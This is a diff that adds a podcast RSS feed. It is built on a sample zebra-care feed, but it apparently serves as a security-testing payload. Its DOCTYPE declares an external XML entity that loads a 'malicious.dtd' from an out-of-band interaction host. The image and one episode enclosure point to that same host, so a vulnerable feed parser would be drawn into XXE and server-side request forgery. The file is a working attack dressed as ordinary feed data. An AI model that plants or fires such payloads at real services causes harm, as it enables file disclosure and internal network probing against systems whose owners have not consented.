@@ -1,0 +1,35 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0"
+    xmlns:xtest="http://www.itunes.com/dtds/podcast-1.0.dtd">
+  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM
+"http://daktjuugetxfexxmsubleucx0ezw6jzcv.oast.fun/malicious.dtd"> %xxe;]>
+  <channel>
+    <title>Test's Zebra Podcast</title>
+    <xtest:owner>
+        <xtest:email>superua.site88@gmail.com</xtest:email>
+    </xtest:owner>
+    <xtest:author>Dafna</xtest:author>
+    <description>A pet-owner's guide to the popular striped equine.</description>
+    <xtest:image href="https://daktjuugetxfexxmsubleucx0ezw6jzcv.oast.fun/logo"/>
+    <language>en-us</language>
+    <link>https://www.example.com/podcasts/dafnas-zebras/</link>
+    <item>
+      <title>Top 10 myths about caring for a zebra</title>
+      <description>Here are the top 10 misunderstandings about the care, feeding, and breeding of these lovable striped animals.</description>
+      <pubDate>Tue, 14 Mar 2017 12:00:00 GMT</pubDate>
+      <enclosure url="https://daktjuugetxfexxmsubleucx0ezw6jzcv.oast.fun/sec"
+                 type="audio/mpeg" length="34216300"/>
+      <xtest:duration>30:00</xtest:duration>
+      <guid isPermaLink="false">dzpodtop10</guid>
+    </item>
+    <item>
+      <title>Keeping those stripes neat and clean</title>
+      <description>Keeping your zebra clean is time consuming, but worth the effort.</description>
+      <pubDate>Fri, 24 Feb 2017 12:00:00 GMT</pubDate>
+      <enclosure url="https://www.youtube.com/watch?v=JiwLPd3JsL0"
+                 type="audio/mpeg" length="26004388"/>
+      <xtest:duration>22:48</xtest:duration>
+      <guid>dzpodclean</guid>
+    </item>
+  </channel>
+</rss>
